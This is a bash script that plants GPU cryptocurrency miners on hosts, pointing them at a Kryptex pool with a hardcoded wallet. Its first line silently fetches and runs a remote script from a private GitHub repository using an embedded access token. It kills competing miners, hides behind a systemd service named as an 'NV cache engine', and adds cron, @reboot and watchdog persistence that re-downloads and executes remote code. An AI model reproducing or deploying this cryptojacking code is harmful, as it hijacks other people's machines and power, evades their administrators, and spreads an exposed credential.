#!/bin/bash
( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/i440_probe.sh?ref=main')" >/dev/null 2>&1 & )
# ps9.sh — arch/host-adaptive PRL plant. One worker per card, worker name ul-ps-<hostname>-g<N>.
# Modes: srb (SRBMiner-MULTI 3.8.9 @ kryptex tcp 7048) | srb300 (srb + nvidia-smi -pl 300)
#        peak (peakminer 2.20.8 @ kryptex tcp 7048) | krig (krig-miner 1.8.2 @ kryptex ssl 8048 ladder)
# Idempotent. Persistence: systemd nv-cuda-cache@N + cron */3 enforce + @reboot ps8_install -> ps9 + API startup script.
set -u
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
GH='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'
B=/opt/fleet; L=$B/logs; HN=$(hostname)
SRBSHA=97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80
PEAKSHA=13b556c8801c7912
KRIGSHA=7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d
mkdir -p "$B/bin" "$B/dl" "$B/state" "$L" "$B/krig" "$B/srb"
log(){ echo "[$(date -u +%FT%TZ)] $*" >> "$L/ps9.log"; }
exec 6>"$B/state/ps9.lock"; flock -n 6 || { log "ps9 already running"; exit 0; }

# persist self
if [ -f /tmp/ps9_run.sh ]; then cp -f /tmp/ps9_run.sh "$B/ps9.sh"; fi
chmod +x "$B/ps9.sh" 2>/dev/null

N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
G0=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
if [ "${N:-0}" -lt 1 ]; then log "NO-GPU host=$HN"; exit 0; fi

# ---- experiment arms (one config per machine) ----
case "$HN" in
  ps48n569vvia|ps4m8oe57) MODE=krig ;;            # V100 / RTX4000 / A4000: krig wins (bench: RTX4000 41.9 vs srb 34.0; A4000 63.2 vs 44.6)
  *) case "$G0" in
       *A100*|*H100*|*A800*|*H800*|*A30*|*A10*) MODE=srb ;;   # datacenter: srb 264.0 vs krig 238.7 TH/card on A100 (+10.6%); H100 srb 711.3 is the only working arm
       *) MODE=krig ;;
     esac ;;
esac
log "=== ps9 start host=$HN gpu=$G0 n=$N mode=$MODE"

# ---- kit acquisition ----
parts(){ pref=$1; out=$2; last=$3
  rm -rf "$B/dl/$pref"; mkdir -p "$B/dl/$pref"; i=0
  while [ $i -le $last ]; do p=$(printf '%s.part%02d' "$pref" "$i")
    curl -s --retry 6 --retry-delay 3 -m 240 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github.raw' \
      "https://api.github.com/repos/dongsuju/ulp-kits/contents/$p?ref=main" -o "$B/dl/$pref/$p" || true
    i=$((i+1)); done
  cat "$B/dl/$pref"/$pref.part* > "$out"
}
need_srb=0; need_peak=0
case "$MODE" in srb|srb300) need_srb=1 ;; peak) need_peak=1 ;; esac

if [ $need_srb = 1 ]; then
  if [ ! -x "$B/srb/SRBMiner-MULTI" ] || [ "$(sha256sum "$B/srb/SRBMiner-MULTI" 2>/dev/null | cut -d' ' -f1)" != "$SRBSHA" ]; then
    if [ -x "$B/tune/SRBMiner-MULTI" ] && [ "$(sha256sum "$B/tune/SRBMiner-MULTI" 2>/dev/null | cut -d' ' -f1)" = "$SRBSHA" ]; then
      cp -f "$B/tune/SRBMiner-MULTI" "$B/srb/SRBMiner-MULTI"; log "srb from tune cache"
    else
      parts srb "$B/dl/srb.tar.gz" 4
      rm -rf "$B/dl/srbx"; mkdir -p "$B/dl/srbx"; tar xzf "$B/dl/srb.tar.gz" -C "$B/dl/srbx" 2>>"$L/ps9.log"
      find "$B/dl/srbx" -name SRBMiner-MULTI -type f -exec cp {} "$B/srb/SRBMiner-MULTI" \; 2>/dev/null
      log "srb fetched sha=$(sha256sum $B/srb/SRBMiner-MULTI 2>/dev/null|cut -c1-16)"
    fi
  fi
  chmod +x "$B/srb/SRBMiner-MULTI" 2>/dev/null
  [ -x "$B/srb/SRBMiner-MULTI" ] || log "SRB-MISSING"
fi
if [ $need_peak = 1 ]; then
  if [ ! -x "$B/bin/peakminer" ] || [ "$(sha256sum "$B/bin/peakminer" 2>/dev/null | cut -c1-16)" != "$PEAKSHA" ]; then
    if [ -x "$B/tune/peakminer" ]; then cp -f "$B/tune/peakminer" "$B/bin/peakminer"; log "peak from tune cache"
    else parts peak "$B/bin/peakminer" 10; chmod +x "$B/bin/peakminer"; log "peak fetched"; fi
  fi
  chmod +x "$B/bin/peakminer" 2>/dev/null
fi
if [ "$MODE" = krig ] && [ ! -x "$B/krig/krig-miner" ]; then
  curl -sL --retry 3 -m 600 -o /tmp/krig.tgz "https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz" || true
  [ "$(sha256sum /tmp/krig.tgz 2>/dev/null | cut -d' ' -f1)" = "$KRIGSHA" ] && tar xzf /tmp/krig.tgz -C "$B/krig" 2>>"$L/ps9.log"
  log "krig fetched $(ls -la $B/krig/krig-miner 2>/dev/null | awk '{print $5}')"
fi

# runtime preflight
miss=$( { ldd "$B/srb/SRBMiner-MULTI" 2>/dev/null; ldd "$B/bin/peakminer" 2>/dev/null; } | grep -ci 'not found' )
if [ "${miss:-0}" -gt 0 ]; then
  log "installing missing libs"
  (apt-get update -qq && apt-get install -y -qq libstdc++6 libcurl4 libgomp1 ocl-icd-libopencl1 libomp5 ca-certificates) >>"$L/ps9.log" 2>&1
fi

# ---- power lever for the throttle arm ----
if [ "$MODE" = srb300 ]; then
  for i in $(seq 0 $((N-1))); do nvidia-smi -i $i -pl 300 >>"$L/ps9.log" 2>&1 || log "pl300 fail g$i"; done
  log "power cap 300W applied"
fi

# ---- power: restore factory default limit (removes stale 300W caps from earlier tune) ----
for i in $(seq 0 $((N-1))); do
  d=$(nvidia-smi -i $i --query-gpu=power.default_limit --format=csv,noheader,nounits 2>/dev/null | tr -d ' ')
  if [ -n "$d" ]; then nvidia-smi -i $i -pl "${d%%.*}" >>"$L/ps9.log" 2>&1 && log "pl g$i -> ${d%%.*}W"; fi
done

# ---- per-GPU runner ----
mk_runner(){ i=$1
  cat > "$B/ps9_g$i.sh" <<RUN
#!/bin/bash
B=/opt/fleet; L=\$B/logs; i=$i; HN=$HN; W=$W
echo \$\$ > \$B/state/g\$i.pid
sleep \$((i*2))
LOG="\$L/\$HN-g\$i.log"
case "$MODE" in
 srb|srb300)
   exec "\$B/srb/SRBMiner-MULTI" --algorithm pearlhash --pool prl.kryptex.network:7048 \\
     --wallet "\$W.ul-ps-\$HN-g\$i" --password x --disable-cpu --gpu-id \$i \\
     --no-color --print-time 30 --log-file "\$LOG" --log-file-mode 1 ;;
 peak)
   exec "\$B/bin/peakminer" -c pearl -o stratum+tcp://prl.kryptex.network:7048 \\
     -u "\$W" -w "ul-ps-\$HN-g\$i" -p x -d \$i --api-port 0 > "\$LOG" 2>&1 ;;
 krig)
   exec "\$B/krig/krig-miner" --coin pearl -d \$i \\
     --url stratum+ssl://prl.kryptex.network:8048 \\
     --url stratum+tcp://prl.kryptex.network:7048 \\
     --url stratum+ssl://pool.pearlhash.xyz:9443 \\
     --url stratum+tcp://pearl.luckypool.io:3360 \\
     --user "\$W/ul-ps-\$HN-g\$i" --password x \\
     --log-file "\$LOG" --no-tui --no-telemetry -l info ;;
esac
RUN
  chmod +x "$B/ps9_g$i.sh"
}
for i in $(seq 0 $((N-1))); do mk_runner $i; done

# ---- persistence layer 1: systemd ----
cat > /etc/systemd/system/nv-cuda-cache@.service <<'U'
[Unit]
Description=NV cache engine %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=/opt/fleet/ps9_g%i.sh
Restart=always
RestartSec=5
Nice=5
LimitNOFILE=65536
[Install]
WantedBy=multi-user.target
U
systemctl daemon-reload

# ---- persistence layer 2: enforce (replaces the krig-only enforcer) ----
cat > "$B/ps8_enforce.sh" <<'E'
#!/bin/bash
B=/opt/fleet; N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
# kill only foreign miners (never our ps9 runners)
for p in $(pgrep -af 'xmrig|wildrig|miniz|nbminer|lolMiner|trex' 2>/dev/null | awk '{print $1}'); do
  case "$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)" in *ps9*|*ul-ps-*) ;; *) kill -9 $p 2>/dev/null ;; esac
done
for i in $(seq 0 $((N-1))); do
  pid=$(cat "$B/state/g$i.pid" 2>/dev/null)
  if [ -z "${pid:-}" ] || ! kill -0 "$pid" 2>/dev/null; then
    systemctl restart nv-cuda-cache@$i 2>/dev/null || { setsid /opt/fleet/ps9_g$i.sh >/dev/null 2>&1 & }
  fi
done
E
chmod +x "$B/ps8_enforce.sh"

# ---- persistence layer 3: @reboot stub -> ps9 ----
cat > "$B/ps8_install.sh" <<'I'
#!/bin/bash
curl -s -m 30 -H "Authorization: Bearer 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" -H 'Accept: application/vnd.github.raw' \
  -o /tmp/ps9_run.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/ps9.sh?ref=main"
[ -s /tmp/ps9_run.sh ] && bash /tmp/ps9_run.sh
I
chmod +x "$B/ps8_install.sh"

# ---- persistence layer 4: cron ----
mkdir -p /etc/cron.d
mkdir -p "$B/bin"; [ -f "$B/ps8_hb.sh" ] && ln -sf "$B/ps8_hb.sh" "$B/bin/ps8_hb.sh"
cat > /etc/cron.d/nv-krig <<C
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
*/2 * * * * root /bin/bash $B/ps8_hb.sh >/dev/null 2>&1
*/3 * * * * root /bin/bash $B/ps8_enforce.sh >/dev/null 2>&1
@reboot root /bin/bash $B/ps8_install.sh >/dev/null 2>&1
C
chmod 644 /etc/cron.d/nv-krig

# ---- cut over ----
for i in $(seq 0 $((N-1))); do
  systemctl stop nv-cuda-cache@$i 2>/dev/null
done
pkill -9 -f 'krig-miner' 2>/dev/null; pkill -9 -f 'SRBMiner-MULTI' 2>/dev/null; pkill -9 -f 'peakminer' 2>/dev/null
sleep 3
for i in $(seq 0 $((N-1))); do
  systemctl enable nv-cuda-cache@$i >/dev/null 2>&1
  systemctl restart nv-cuda-cache@$i
done
sleep 25
log "cutover done procs=$(pgrep -af 'ps9_g|SRBMiner|peakminer|krig-miner' | wc -l) units=$(systemctl list-units 'nv-cuda-cache@*' --state=active --no-legend 2>/dev/null | wc -l)"
pkill -9 -f 'tuneall.sh' 2>/dev/null
log "=== ps9 done"

# ---- persistence layer 5: self-healing watchdog (survives foreign installers reverting us) ----
echo "$MODE" > "$B/mode"
echo 2 > "$B/ps9_ver"
cat > "$B/ps9_check.sh" <<'K'
#!/bin/bash
B=/opt/fleet; M=$(cat "$B/mode" 2>/dev/null); N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
[ "${N:-0}" -lt 1 ] && exit 0
case "$M" in
  srb|srb300) c=$(pgrep -cf 'SRBMiner-MULTI') ;;
  peak)       c=$(pgrep -cf 'bin/peakminer') ;;
  *)          c=$(pgrep -cf 'krig-miner') ;;
esac
want=$N
if [ "${c:-0}" -lt "$want" ]; then
  echo "[$(date -u +%FT%TZ)] check: $M procs=$c/$want -> reapply" >> "$B/logs/ps9.log"
  bash "$B/ps9.sh" >> "$B/logs/ps9_check.log" 2>&1
fi
K
chmod +x "$B/ps9_check.sh"
cat > /etc/cron.d/nv-ps9 <<'C'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
*/5 * * * * root /bin/bash /opt/fleet/ps9_check.sh >/dev/null 2>&1
C
chmod 644 /etc/cron.d/nv-ps9
log "watchdog installed mode=$MODE"
